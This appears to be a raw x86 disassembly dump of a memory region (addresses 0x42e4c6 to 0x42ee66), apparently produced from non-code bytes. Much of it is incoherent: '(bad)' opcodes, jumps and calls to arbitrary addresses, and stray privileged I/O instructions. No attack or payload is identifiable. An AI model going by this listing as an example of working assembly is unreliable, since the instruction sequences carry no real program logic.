  42e4c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e4c7:	scas   eax,DWORD PTR es:[edi]
  42e4c8:	or     BYTE PTR [edx+0x9],ch
  42e4cb:	push   ebx
  42e4cc:	sbb    BYTE PTR [esi-0x69],ah
  42e4cf:	cmp    eax,0xdbaddd0f
  42e4d4:	call   0x29f46391
  42e4d9:	jae    0x42e47e
  42e4db:	scas   eax,DWORD PTR es:[edi]
  42e4dc:	xchg   esi,eax
  42e4dd:	sub    ebp,DWORD PTR [ecx]
  42e4df:	mov    ah,0x2c
  42e4e1:	inc    DWORD PTR [ebx+eax*8]
  42e4e4:	dec    esi
  42e4e5:	lods   al,BYTE PTR ds:[esi]
  42e4e6:	dec    ebp
  42e4e7:	sub    eax,0x7b9086c2
  42e4ec:	cmp    BYTE PTR fs:[ecx-0x4b5061e5],dl
  42e4f3:	mov    eax,ds:0x3b179b7
  42e4f8:	and    eax,0xd763085a
  42e4fd:	mov    es,WORD PTR [eax-0x7]
  42e500:	sbb    bl,BYTE PTR [edi]
  42e502:	jecxz  0x42e4ce
  42e504:	mov    ecx,0x9939f6a2
  42e509:	xchg   BYTE PTR ds:0x6519e092,bl
  42e50f:	les    ebp,FWORD PTR [esi-0x2a]
  42e512:	jbe    0x42e570
  42e514:	popa   
  42e515:	mov    ch,0xd3
  42e517:	inc    edi
  42e518:	retf   
  42e519:	out    dx,eax
  42e51a:	enter  0xd739,0x9f
  42e51e:	sub    al,0x23
  42e520:	cmp    cl,0x12
  42e523:	mov    BYTE PTR [esi-0x5e],bh
  42e526:	lock das 
  42e528:	test   eax,0x6e200365
  42e52d:	rol    DWORD PTR [ebx+ebp*8+0xf],0x30
  42e532:	rcr    dl,0xe0
  42e535:	xlat   BYTE PTR ds:[ebx]
  42e536:	mov    ch,0x13
  42e538:	push   esi
  42e539:	mov    eax,ds:0x1ae8f53b
  42e53e:	xor    eax,0x781ce594
  42e543:	sub    al,0x5c
  42e545:	add    eax,0x69291bbc
  42e54a:	(bad)  
  42e54b:	xor    al,0x8d
  42e54d:	jl     0x42e4ec
  42e54f:	setg   BYTE PTR [esi+0x39]
  42e553:	ja     0x42e529
  42e555:	mov    bh,0xda
  42e557:	push   esi
  42e558:	mov    bh,BYTE PTR [ebx+0x6da25d41]
  42e55e:	rol    ch,0x3b
  42e561:	sahf   
  42e562:	fldl2t 
  42e564:	loope  0x42e521
  42e566:	scas   eax,DWORD PTR es:[edi]
  42e567:	pop    es
  42e568:	sbb    al,0xbd
  42e56a:	pop    esp
  42e56b:	jge    0x42e5da
  42e56d:	not    DWORD PTR [edx]
  42e56f:	(bad)  
  42e571:	or     BYTE PTR [ecx],bl
  42e573:	xchg   dx,ax
  42e575:	add    al,0x6a
  42e577:	add    esp,DWORD PTR [ebx+eiz*2]
  42e57a:	pop    ds
  42e57b:	pop    ecx
  42e57c:	repnz scas al,BYTE PTR es:[edi]
  42e57e:	sbb    al,0x47
  42e580:	xor    DWORD PTR [edx-0x47733080],eax
  42e586:	jno    0x42e568
  42e588:	pop    ecx
  42e589:	jp     0x42e594
  42e58b:	scas   eax,DWORD PTR es:[edi]
  42e58c:	(bad)  
  42e58d:	jmp    0xd1edc3
	...
  42e5f2:	add    BYTE PTR [eax],al
  42e5f4:	push   ebp
  42e5f5:	cmp    dh,cl
  42e5f7:	adc    bh,ch
  42e5f9:	neg    bh
  42e5fb:	jge    0x42e58f
  42e5fd:	xchg   ebp,eax
  42e5fe:	jns    0x42e631
  42e600:	add    al,0xd5
  42e602:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e603:	mov    DWORD PTR [esi-0xf],ebx
  42e606:	add    DWORD PTR [eax],eax
  42e608:	add    eax,0x2f000001
  42e60d:	sbb    BYTE PTR [ebx+eiz*8+0x3c64472],cl
  42e614:	cld    
  42e615:	into   
  42e616:	push   ss
  42e617:	dec    ebp
  42e618:	std    
  42e619:	out    dx,al
  42e61a:	dec    eax
  42e61b:	clc    
  42e61c:	repnz test al,0x60
  42e61f:	loop   0x42e63a
  42e621:	(bad)  
  42e622:	adc    cl,ah
  42e624:	rcr    BYTE PTR [eax],0x18
  42e627:	dec    edx
  42e628:	dec    eax
  42e629:	cmp    esp,edx
  42e62b:	bound  ecx,QWORD PTR [eax+edi*1]
  42e62e:	call   0x8e8b:0x78f0da3
  42e635:	ss inc esp
  42e637:	jl     0x42e68c
  42e639:	mov    bl,0x5a
  42e63b:	xor    eax,0xa054e913
  42e640:	xchg   esi,eax
  42e641:	xchg   esp,eax
  42e642:	add    dl,dh
  42e644:	pop    eax
  42e645:	push   ebp
  42e646:	ror    DWORD PTR [esi+0x51],0x7e
  42e64a:	dec    esi
  42e64b:	fstp   TBYTE PTR [esi]
  42e64d:	pop    ebx
  42e64e:	(bad)  
  42e650:	mov    al,0x64
  42e652:	dec    ebx
  42e653:	mov    cl,0x51
  42e655:	add    eax,0x729cc105
  42e65a:	pop    edx
  42e65b:	cmp    al,0x53
  42e65d:	xor    al,0x4
  42e65f:	mov    WORD PTR [esi-0x16],cs
  42e662:	lea    edx,[ebp+eax*2-0x2e]
  42e666:	dec    esp
  42e667:	in     al,0x4c
  42e669:	pop    esi
  42e66a:	pop    esp
  42e66b:	test   DWORD PTR [ecx-0x58],ecx
  42e66e:	test   al,0xe1
  42e670:	push   eax
  42e671:	cs push ecx
  42e673:	mov    ebx,0x1e727704
  42e678:	sbb    al,BYTE PTR [ebp+eax*8+0x6f2e483d]
  42e67f:	or     eax,0xffcb9646
  42e684:	fnsave [ecx]
  42e686:	rcl    DWORD PTR [edx],1
  42e688:	test   cl,0x52
  42e68b:	fcmovnu st,st(3)
  42e68d:	xchg   ebx,eax
  42e68e:	pop    esi
  42e68f:	test   BYTE PTR [ecx+0x9],dl
  42e692:	(bad)  
  42e694:	pop    edx
  42e695:	dec    esi
  42e696:	pop    es
  42e697:	mov    ebp,es
  42e699:	xchg   ebx,eax
  42e69a:	aam    0x1b
  42e69c:	push   0xffffffd6
  42e69e:	nop
  42e69f:	jo     0x42e6ea
  42e6a1:	jo     0x42e6b9
  42e6a3:	ficom  DWORD PTR [ebx-0x3b]
  42e6a6:	dec    ecx
  42e6a7:	arpl   ax,bx
  42e6a9:	std    
  42e6aa:	jnp    0x42e695
  42e6ac:	mov    ebp,DWORD PTR [ebx-0x26]
  42e6af:	inc    esp
  42e6b0:	xlat   BYTE PTR ds:[ebx]
  42e6b1:	sbb    ch,BYTE PTR [eax]
  42e6b3:	push   edi
  42e6b4:	jle    0x42e68c
  42e6b6:	mov    es,WORD PTR [ecx+esi*4-0x5f2ef1a0]
  42e6bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e6be:	mov    ebp,DWORD PTR [edx-0x41]
  42e6c1:	cmp    al,0x70
  42e6c3:	jmp    0xa3354a77
  42e6c8:	gs xchg ebp,eax
  42e6ca:	neg    DWORD PTR [edi]
  42e6cc:	fdivr  DWORD PTR [edi+edi*8+0x76b141b0]
  42e6d3:	retf   
  42e6d4:	test   eax,0x5b0a32c4
  42e6d9:	loope  0x42e707
  42e6db:	inc    esp
  42e6dc:	xchg   edx,eax
  42e6dd:	fxch   st(5)
  42e6df:	ja     0x42e669
  42e6e1:	push   0x747411fd
  42e6e6:	xor    eax,esi
  42e6e8:	ins    DWORD PTR es:[edi],dx
  42e6e9:	mov    al,0x45
  42e6eb:	xchg   edi,eax
  42e6ec:	and    BYTE PTR [ebp-0x6c],bl
  42e6ef:	(bad)  
  42e6f0:	test   eax,0x72212ac5
  42e6f5:	jo     0x42e720
  42e6f7:	pushf  
  42e6f8:	test   eax,0xf63ff0f
  42e6fd:	mov    eax,ds:0xd4aed101
  42e702:	pushf  
  42e703:	lea    eax,[ecx+0x78]
  42e706:	cmp    BYTE PTR [ebp-0x5e],ch
  42e709:	push   0xd05687b8
  42e70e:	imul   esi,DWORD PTR fs:[edi],0x0
	...
  42e772:	add    BYTE PTR [eax],al
  42e774:	pop    edx
  42e775:	cmp    DWORD PTR [esi+0x2d],ecx
  42e778:	outs   dx,DWORD PTR ds:[esi]
  42e779:	jg     0x42e7f6
  42e77b:	jg     0x42e7e1
  42e77d:	sub    BYTE PTR [esi],cl
  42e77f:	ficom  DWORD PTR [ebx-0x31]
  42e782:	icebp  
  42e783:	dec    esp
  42e784:	arpl   dx,si
  42e786:	add    DWORD PTR [eax],eax
  42e788:	add    eax,0xad000001
  42e78d:	ds pop ecx
  42e78f:	js     0x42e723
  42e791:	ins    DWORD PTR es:[edi],dx
  42e792:	push   ecx
  42e793:	cdq    
  42e794:	or     al,0x56
  42e796:	cmp    al,0x40
  42e798:	sbb    bl,BYTE PTR [edx+edi*2+0x5296898f]
  42e79f:	push   esp
  42e7a0:	daa    
  42e7a1:	xchg   edx,eax
  42e7a2:	sub    esi,DWORD PTR [eax]
  42e7a4:	ss pop eax
  42e7a6:	mov    dl,0x13
  42e7a8:	mov    ds:0xc20e8c17,eax
  42e7ad:	arpl   WORD PTR [edi+0x4d35a187],cx
  42e7b3:	fdivr  QWORD PTR [esi+eiz*8-0x57855eb9]
  42e7ba:	or     eax,DWORD PTR [ecx+0x39]
  42e7bd:	fnsave [ecx]
  42e7bf:	dec    edi
  42e7c0:	scas   al,BYTE PTR es:[edi]
  42e7c1:	neg    BYTE PTR [ecx]
  42e7c3:	add    eax,0xaad14989
  42e7c8:	mov    gs,WORD PTR [eax-0x19]
  42e7cb:	sbb    ah,dl
  42e7cd:	es mov edi,0xab9a58b
  42e7d3:	mov    ch,0x64
  42e7d5:	leave  
  42e7d6:	int3   
  42e7d7:	arpl   WORD PTR [esi-0x2b],dx
  42e7da:	in     ax,0x52
  42e7dd:	xor    ebp,DWORD PTR ds:0x27215ccc
  42e7e3:	xchg   edi,eax
  42e7e4:	jnp    0x42e828
  42e7e6:	cmp    al,0x5c
  42e7e8:	push   ecx
  42e7e9:	mov    ch,BYTE PTR ss:[ebp+0x3d]
  42e7ed:	push   ebx
  42e7ee:	test   al,0x88
  42e7f0:	popf   
  42e7f1:	mov    ebx,0xdd164e85
  42e7f6:	std    
  42e7f7:	xor    al,0xa1
  42e7f9:	fst    QWORD PTR [ebx-0x4f]
  42e7fc:	push   esp
  42e7fd:	or     ax,0x7176
  42e801:	aam    0xd5
  42e803:	shl    DWORD PTR [ebx-0x42],1
  42e806:	mov    gs,WORD PTR [ebp+0x685cf7bd]
  42e80c:	xor    al,0x7f
  42e80e:	mov    eax,?
  42e810:	mov    ebx,0x4899a9ac
  42e815:	mov    edi,0x8bda0992
  42e81a:	clc    
  42e81b:	dec    eax
  42e81c:	cmc    
  42e81d:	inc    ebp
  42e81e:	sahf   
  42e81f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e820:	pop    ss
  42e821:	outs   dx,BYTE PTR ds:[esi]
  42e822:	cli    
  42e823:	popf   
  42e824:	inc    eax
  42e825:	sub    eax,0x16b4aa75
  42e82a:	mov    cl,0xf3
  42e82c:	xchg   ebp,eax
  42e82d:	add    eax,0xdc0e9ee3
  42e832:	in     eax,0x7d
  42e834:	dec    esp
  42e835:	jl     0x42e861
  42e837:	int3   
  42e838:	push   ebp
  42e839:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e83a:	scas   eax,DWORD PTR es:[edi]
  42e83b:	shl    BYTE PTR [edx],0xf4
  42e83e:	out    dx,al
  42e83f:	add    BYTE PTR [ebx+esi*1+0x6fe336a7],dh
  42e846:	mov    ebp,0x3f3076f9
  42e84b:	stc    
  42e84c:	mov    WORD PTR [esi],gs
  42e84e:	test   eax,0x20909659
  42e853:	mul    BYTE PTR [edx+0x63]
  42e856:	retf   0x1cfd
  42e859:	and    ecx,DWORD PTR [eax]
  42e85b:	aam    0x47
  42e85d:	jmp    0x2c95ecc1
  42e862:	xlat   BYTE PTR ds:[ebx]
  42e863:	add    BYTE PTR es:[esi-0x3c],bh
  42e867:	shl    al,1
  42e869:	mov    ebp,0xd27ef06b
  42e86e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e86f:	aaa    
  42e870:	mov    fs,WORD PTR [edi]
  42e872:	(bad)  
  42e873:	shr    BYTE PTR [eax-0x21fc272],1
  42e879:	jno    0x42e8e1
  42e87b:	and    eax,0x5a034e8b
  42e880:	lds    edx,FWORD PTR [ebx+0x7a]
  42e883:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e884:	icebp  
  42e885:	dec    eax
  42e886:	lock sbb eax,0x4952779a
  42e88c:	xor    BYTE PTR [edx+ebx*1],bh
  42e88f:	mov    ebp,0x62
	...
  42e8f4:	ret    
  42e8f5:	ja     0x42e957
  42e8f7:	and    al,0xf4
  42e8f9:	aaa    
  42e8fa:	(bad)  
  42e8fb:	div    DWORD PTR [ecx-0x16dc07d5]
  42e901:	jne    0x42e8ff
  42e903:	jl     0x42e96d
  42e905:	repz add DWORD PTR [eax],eax
  42e908:	add    eax,0x9b000001
  42e90d:	sub    ah,BYTE PTR [eax-0x47]
  42e910:	fdivrp st(5),st
  42e912:	pop    esp
  42e913:	icebp  
  42e914:	jbe    0x42e920
  42e916:	cmp    ah,BYTE PTR [edi-0x77]
  42e919:	sbb    BYTE PTR [ecx-0x3d373494],ah
  42e91f:	outs   dx,BYTE PTR ds:[esi]
  42e920:	aaa    
  42e921:	adc    bl,BYTE PTR [ebp-0x74675509]
  42e927:	(bad)  [edx]
  42e929:	xor    BYTE PTR [ecx-0x63],bl
  42e92c:	loop   0x42e8c0
  42e92e:	and    DWORD PTR [eax+0x6],edx
  42e931:	and    DWORD PTR [edx-0x71],edx
  42e934:	pop    eax
  42e935:	ds jae 0x42e987
  42e938:	mov    ds,WORD PTR [ecx]
  42e93a:	daa    
  42e93b:	sub    dl,BYTE PTR [eax]
  42e93d:	jecxz  0x42e9a9
  42e93f:	mov    eax,ds:0xb05d3ed5
  42e944:	shl    DWORD PTR [ebx+0x712e7991],cl
  42e94a:	cmp    DWORD PTR [ebp+0x75f39f24],esp
  42e950:	xchg   esi,eax
  42e951:	fwait
  42e952:	jno    0x42e947
  42e954:	daa    
  42e955:	retf   0xe883
  42e958:	mul    DWORD PTR [esi+0x1ae0f1]
  42e95e:	mov    dl,0x54
  42e960:	out    dx,eax
  42e961:	mov    ah,0x27
  42e963:	cmp    DWORD PTR [ebx+0x78015390],esp
  42e969:	shl    ebx,cl
  42e96b:	repz mov ah,0x92
  42e96e:	xor    al,0xbf
  42e970:	pop    es
  42e971:	jge    0x42e9d8
  42e973:	add    al,0x94
  42e975:	hlt    
  42e976:	lods   eax,DWORD PTR ds:[esi]
  42e977:	adc    eax,0xa590f5a5
  42e97c:	mov    edx,0xd7473f55
  42e981:	xchg   edx,eax
  42e982:	jecxz  0x42e9f1
  42e984:	sbb    BYTE PTR [ebx+ebx*1-0x6],ah
  42e988:	pop    esp
  42e989:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e98a:	cs aas 
  42e98c:	cld    
  42e98d:	xchg   ebp,eax
  42e98e:	dec    esp
  42e98f:	dec    edx
  42e990:	je     0x42e929
  42e992:	or     DWORD PTR es:[edi+0x57216291],esi
  42e999:	int3   
  42e99a:	xchg   ebx,eax
  42e99b:	test   BYTE PTR [ebp+0x76039066],cl
  42e9a1:	data16 das 
  42e9a3:	mov    bh,0x83
  42e9a5:	dec    ebx
  42e9a6:	jns    0x42ea07
  42e9a8:	and    edi,DWORD PTR [ecx+ecx*2]
  42e9ab:	mov    ds:0xdd42fbab,al
  42e9b0:	inc    eax
  42e9b1:	jne    0x42ea2b
  42e9b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e9b4:	dec    edx
  42e9b5:	and    BYTE PTR [esi+eax*2-0x10813bf4],cl
  42e9bc:	dec    esi
  42e9bd:	mov    bl,BYTE PTR [ebx+0xd378d14]
  42e9c3:	pop    es
  42e9c4:	dec    ebp
  42e9c5:	mov    dl,0xa5
  42e9c7:	cmp    edx,DWORD PTR [ecx+edx*1-0x58ee1fdd]
  42e9ce:	bound  esp,QWORD PTR [edx+0x4b]
  42e9d1:	iret   
  42e9d2:	loopne 0x42e9e4
  42e9d4:	mov    ebp,0x19210405
  42e9d9:	stc    
  42e9da:	push   ebp
  42e9db:	leave  
  42e9dc:	mov    dh,0xfe
  42e9de:	(bad)  
  42e9df:	imul   ecx,DWORD PTR [eax],0x5e
  42e9e2:	inc    edi
  42e9e3:	stc    
  42e9e4:	test   DWORD PTR [esi-0x6fb15b33],esi
  42e9ea:	sbb    eax,0x73a2cd63
  42e9ef:	push   0xd1a6d174
  42e9f4:	shr    al,cl
  42e9f6:	jmp    0x42ea63
  42e9f8:	repz jp 0x42e9dd
  42e9fb:	push   esi
  42e9fc:	mov    ch,0x5e
  42e9fe:	adc    DWORD PTR [eax],esp
  42ea00:	in     eax,0x9b
  42ea02:	mov    edi,0xa4e139f
  42ea07:	xor    BYTE PTR ds:0x98b4dfa1,dl
  42ea0d:	lea    edx,[esi+0x9dad]
	...
  42ea73:	add    ch,ah
  42ea75:	mov    edx,0xebdfe392
  42ea7a:	cmc    
  42ea7b:	mov    esi,0x66dc160c
  42ea80:	push   esp
  42ea81:	aam    0xb
  42ea83:	mov    ebp,DWORD PTR [ebp-0xc]
  42ea86:	add    DWORD PTR [eax],eax
  42ea88:	add    eax,0x13000001
  42ea8d:	lock fadd DWORD PTR [esi+esi*8+0x4367587e]
  42ea95:	pop    ecx
  42ea96:	pop    ss
  42ea97:	sub    edx,DWORD PTR [edx]
  42ea99:	aam    0x3d
  42ea9b:	push   esi
  42ea9c:	stc    
  42ea9d:	jmp    0xfd48983
  42eaa2:	sub    DWORD PTR [ebp+0x7d232f17],eax
  42eaa8:	mov    dl,0x61
  42eaaa:	(bad)  
  42eaab:	outs   dx,DWORD PTR ds:[esi]
  42eaac:	cs jle 0x42eae9
  42eaaf:	mov    bh,0xb4
  42eab1:	inc    edi
  42eab2:	out    0xa8,eax
  42eab4:	sbb    al,0x32
  42eab6:	aaa    
  42eab7:	xchg   esi,eax
  42eab8:	jecxz  0x42eb1f
  42eaba:	mov    esp,0xc4e2747b
  42eabf:	inc    ebp
  42eac0:	cmp    eax,0x3c9cee88
  42eac5:	pop    esp
  42eac6:	and    bh,BYTE PTR [edx-0x5f]
  42eac9:	ds cli 
  42eacb:	out    0x47,eax
  42eacd:	leave  
  42eace:	xchg   DWORD PTR [ebx],ebx
  42ead0:	xlat   BYTE PTR ds:[ebx]
  42ead1:	clc    
  42ead2:	mov    esp,0x1b0c28f6
  42ead7:	push   esi
  42ead8:	rcr    BYTE PTR [edx+edi*1-0x5c992b10],1
  42eadf:	pop    ecx
  42eae0:	retf   0xec37
  42eae3:	in     al,0x3b
  42eae5:	add    DWORD PTR [eax-0x7a],eax
  42eae8:	pushf  
  42eae9:	ins    BYTE PTR es:[edi],dx
  42eaea:	xchg   esi,eax
  42eaeb:	xor    edi,DWORD PTR [ecx-0x2bad7dbf]
  42eaf1:	mov    ebp,ecx
  42eaf3:	into   
  42eaf4:	adc    al,0xc
  42eaf6:	fdivr  DWORD PTR [ebp+0x44]
  42eaf9:	pop    ebx
  42eafa:	imul   eax,ebx,0x60aa1c92
  42eb00:	adc    dh,0x7
  42eb03:	(bad)  
  42eb04:	popf   
  42eb05:	das    
  42eb06:	dec    esi
  42eb07:	cmp    edi,DWORD PTR [esi+0x2d97b45d]
  42eb0d:	ja     0x42eb21
  42eb0f:	ins    BYTE PTR es:[edi],dx
  42eb10:	pop    esi
  42eb11:	mov    bh,0xbd
  42eb14:	mov    eax,0x7f3af39
  42eb19:	scas   al,BYTE PTR es:[edi]
  42eb1a:	add    DWORD PTR [esi],eax
  42eb1c:	(bad)  
  42eb1d:	jmp    0x35632966
  42eb22:	test   BYTE PTR [edi+0x14828aca],dh
  42eb28:	mov    bh,0x87
  42eb2a:	sbb    DWORD PTR [ebp-0x5b],eax
  42eb2d:	daa    
  42eb2e:	mov    esi,0xf53dd6b5
  42eb33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42eb34:	gs pop ebp
  42eb36:	pop    es
  42eb37:	in     al,0x34
  42eb39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42eb3a:	mov    BYTE PTR [ecx+0x27],dh
  42eb3d:	pop    ebx
  42eb3e:	test   eax,0xdcfacf98
  42eb43:	add    ch,BYTE PTR [ebp-0x22]
  42eb46:	cmp    al,0xa4
  42eb48:	es xchg ecx,eax
  42eb4a:	adc    ch,0x35
  42eb4d:	mov    eax,0x869e230a
  42eb52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42eb53:	cmp    BYTE PTR [ebx-0x516c1a0a],dh
  42eb59:	xor    dh,BYTE PTR [ecx+0x39]
  42eb5c:	jle    0x42eb0c
  42eb5e:	shl    dl,0xc9
  42eb61:	add    DWORD PTR [eax-0x49],ebp
  42eb64:	jne    0x42eb58
  42eb66:	xchg   al,cl
  42eb68:	add    al,0x6e
  42eb6a:	cdq    
  42eb6b:	add    BYTE PTR [eax],ch
  42eb6d:	inc    ecx
  42eb6e:	dec    esp
  42eb6f:	xor    ebp,DWORD PTR [edx-0x3511f504]
  42eb75:	jo     0x42eb1b
  42eb77:	adc    bh,BYTE PTR [edi]
  42eb79:	fidivr WORD PTR [ebp-0x6d]
  42eb7c:	xor    eax,0x441c3c00
  42eb81:	push   es
  42eb82:	lds    eax,FWORD PTR [edi+0x23]
  42eb85:	sub    BYTE PTR [esi-0x5086ef6f],0x64
  42eb8c:	fwait
  42eb8d:	jo     0x42eb8d
  42eb8f:	cmp    dh,ch
	...
  42ebf1:	add    BYTE PTR [eax],al
  42ebf3:	add    BYTE PTR [esi+0x41],bh
  42ebf6:	jne    0xfc41bb3b
  42ebfc:	pusha  
  42ebfd:	popf   
  42ebfe:	pop    ecx
  42ebff:	sbb    DWORD PTR [edx+eiz*8-0xa8d65f1],0x1050001
  42ec0a:	add    BYTE PTR [eax],al
  42ec0c:	sub    al,bh
  42ec0e:	or     dl,ch
  42ec10:	sbb    eax,0xc28b36dc
  42ec15:	pop    ebx
  42ec16:	shr    BYTE PTR gs:[eax-0x12702705],0xc1
  42ec1e:	push   ss
  42ec1f:	jno    0x42ebe8
  42ec21:	out    0x48,al
  42ec23:	pop    edx
  42ec24:	aaa    
  42ec25:	jne    0x42ec3a
  42ec27:	xchg   ebx,eax
  42ec28:	das    
  42ec29:	mov    bl,0xc1
  42ec2b:	icebp  
  42ec2c:	pushf  
  42ec2d:	xchg   ecx,eax
  42ec2e:	div    BYTE PTR [esi+edi*1-0x5]
  42ec32:	jp     0x42ebd3
  42ec34:	jmp    0x47cda05c
  42ec39:	push   ss
  42ec3a:	pop    eax
  42ec3b:	push   0x75820b88
  42ec40:	add    esp,DWORD PTR [esi+0x33]
  42ec43:	and    al,0x3f
  42ec45:	and    DWORD PTR [esi-0x64],0x4e
  42ec49:	pusha  
  42ec4a:	jb     0x42ec8d
  42ec4c:	xchg   ecx,eax
  42ec4d:	popf   
  42ec4e:	and    eax,0xd18b7ba6
  42ec53:	mov    esi,0x3e8c9c67
  42ec58:	int    0x76
  42ec5a:	lds    edx,FWORD PTR [edx]
  42ec5c:	or     al,0xda
  42ec5e:	mov    bl,0xef
  42ec60:	adc    ah,BYTE PTR [eax+eax*8]
  42ec63:	cmp    BYTE PTR [edi+0x48e9cb9d],bl
  42ec69:	mov    eax,0x3e053ff5
  42ec6e:	jg     0x42ec44
  42ec70:	jno    0x42ec7b
  42ec72:	mov    dl,BYTE PTR [esi]
  42ec74:	les    ebp,FWORD PTR ds:0x537af24
  42ec7a:	div    BYTE PTR [eax]
  42ec7c:	push   0x1549956c
  42ec81:	test   eax,0x201264d5
  42ec86:	push   ecx
  42ec87:	push   es
  42ec88:	sub    BYTE PTR [edi-0x72ea6b9d],dh
  42ec8e:	or     eax,0x191b7c00
  42ec93:	pop    ecx
  42ec94:	push   eax
  42ec95:	push   ecx
  42ec96:	test   DWORD PTR [eax-0x44],eax
  42ec99:	aad    0xe7
  42ec9b:	xchg   edx,eax
  42ec9c:	jp     0x42ec72
  42ec9e:	sub    ch,BYTE PTR [esi]
  42eca0:	(bad)  
  42eca1:	xchg   ecx,eax
  42eca2:	ja     0x42eccc
  42eca4:	or     dl,BYTE PTR [ebx-0x5d]
  42eca7:	pop    ss
  42eca8:	xchg   esp,eax
  42eca9:	xor    ecx,DWORD PTR [edi]
  42ecab:	mov    edx,0x72744812
  42ecb0:	push   ebp
  42ecb1:	jns    0x42eca6
  42ecb3:	popf   
  42ecb4:	sub    BYTE PTR cs:[ebp+0x20],al
  42ecb8:	mov    al,ds:0x289424bd
  42ecbd:	or     DWORD PTR [edi],0x77cc225c
  42ecc3:	push   cs
  42ecc4:	jg     0x42ecd5
  42ecc6:	outs   dx,BYTE PTR ds:[esi]
  42ecc7:	inc    esp
  42ecc8:	lods   al,BYTE PTR ds:[esi]
  42ecc9:	pushf  
  42ecca:	mov    eax,0x1281c8ca
  42eccf:	fisttp QWORD PTR [ecx]
  42ecd1:	fdiv   DWORD PTR [ebp+ecx*4-0x551c3103]
  42ecd8:	mov    ds:0x1b1814a8,eax
  42ecdd:	test   DWORD PTR ds:0xf99d531c,ebp
  42ece3:	jne    0x42ec74
  42ece5:	jns    0x42ed24
  42ece7:	dec    ecx
  42ece8:	adc    al,0xdc
  42ecea:	jle    0x42ec7e
  42ecec:	cmp    DWORD PTR [ecx+0x42],edi
  42ecef:	xchg   ebp,eax
  42ecf0:	fcmovnbe st,st(6)
  42ecf2:	sub    ebx,ecx
  42ecf4:	sub    ch,BYTE PTR [esi]
  42ecf6:	nop
  42ecf7:	daa    
  42ecf8:	jecxz  0x42ed72
  42ecfa:	lods   al,BYTE PTR ds:[esi]
  42ecfb:	inc    eax
  42ecfc:	xchg   edi,eax
  42ecfd:	gs adc eax,0xe0ca0ff4
  42ed03:	aam    0xd
  42ed05:	sub    BYTE PTR [edx-0x32],cl
  42ed08:	fadd   QWORD PTR [eax]
  42ed0a:	jne    0x42ed5e
  42ed0c:	jge    0x42ed42
  42ed0e:	push   edx
  42ed0f:	push   ss
  42ed10:	dec    edx
	...
  42ed71:	add    BYTE PTR [eax],al
  42ed73:	add    BYTE PTR [edx],ch
  42ed75:	imul   BYTE PTR [edi+0x7fd9ffd8]
  42ed7b:	mul    bl
  42ed7d:	xor    al,BYTE PTR [ebp-0x732bf95e]
  42ed83:	add    DWORD PTR [edi-0xa],esi
  42ed86:	add    DWORD PTR [eax],eax
  42ed88:	add    eax,0xf2000001
  42ed8d:	xor    eax,0x8f68ccda
  42ed92:	inc    eax
  42ed93:	into   
  42ed94:	xchg   ebx,eax
  42ed95:	int    0x61
  42ed97:	cmc    
  42ed98:	jno    0x42edc1
  42ed9a:	mov    esp,0x5c2dbfed
  42ed9f:	mov    bh,0x44
  42eda1:	cmc    
  42eda2:	cmc    
  42eda3:	sti    
  42eda4:	sub    BYTE PTR [ecx+0x78],bh
  42eda7:	enter  0xca64,0xa8
  42edab:	jo     0x42ee1d
  42edad:	neg    BYTE PTR [ebp+eiz*8-0x4b]
  42edb1:	dec    ebp
  42edb2:	mov    ds:0xcba3d0a8,eax
  42edb7:	jnp    0x42ee01
  42edb9:	mov    ecx,ebx
  42edbb:	xchg   edi,eax
  42edbc:	xchg   BYTE PTR [edi-0x21fe55b2],bh
  42edc2:	or     BYTE PTR [eax-0x3],cl
  42edc5:	jnp    0x42ee17
  42edc7:	inc    esi
  42edc8:	data16 fmul DWORD PTR [ecx+0x59]
  42edcc:	inc    ebp
  42edcd:	stos   BYTE PTR es:[edi],al
  42edce:	nop
  42edcf:	rol    DWORD PTR [ebp+ebp*2+0x4],cl
  42edd3:	sbb    dh,BYTE PTR [esp+edi*4+0x11461aa]
  42edda:	pop    ds
  42eddb:	gs clc 
  42eddd:	nop
  42edde:	mov    al,ds:0xbee633c4
  42ede3:	mov    edi,gs
  42ede5:	jmp    0xdce3:0x40e68ba2
  42edec:	test   DWORD PTR [esi+ebp*2],esp
  42edef:	fistp  WORD PTR [edx]
  42edf1:	cmp    BYTE PTR [eax+0x69],dh
  42edf4:	pop    ds
  42edf5:	in     al,dx
  42edf6:	mov    eax,ds:0x6deca95
  42edfb:	add    dl,ch
  42edfd:	mov    ds:0x323aa0de,eax
  42ee02:	mov    ebx,0xe83fa02a
  42ee07:	mov    ah,0x26
  42ee09:	shr    bh,0xe7
  42ee0c:	das    
  42ee0d:	cmp    ebp,DWORD PTR [ebp+0xca355a0]
  42ee13:	enter  0x4550,0x63
  42ee17:	fstp   DWORD PTR [ecx-0x31]
  42ee1a:	mov    esp,ds
  42ee1c:	adc    ah,BYTE PTR ds:0xbb15c1ed
  42ee22:	call   0xc53fd616
  42ee27:	mov    edx,0xa37c1e84
  42ee2c:	mov    ecx,0x53e15667
  42ee31:	sbb    bl,BYTE PTR [ecx-0x57]
  42ee34:	mul    BYTE PTR [esi-0x46fbbc40]
  42ee3a:	ja     0x42ee07
  42ee3c:	push   0x45
  42ee3e:	ret    0xc94e
  42ee41:	call   DWORD PTR [edx-0xab0db86]
  42ee47:	inc    edx
  42ee48:	add    DWORD PTR [ecx+0x25bc2ce0],ebx
  42ee4e:	mov    al,ds:0x41be4dba
  42ee53:	dec    edx
  42ee54:	cmp    dh,BYTE PTR [esi]
  42ee56:	sub    al,0x8
  42ee58:	test   BYTE PTR ds:[esi],dh
  42ee5b:	dec    esp
  42ee5c:	push   ds
  42ee5d:	push   ss
  42ee5e:	mov    BYTE PTR [eax],al
  42ee60:	or     ch,BYTE PTR ds:0x7c4fe170
  42ee66:	adc    BYTE PTR [eax+ebp*4-0x3e],ch
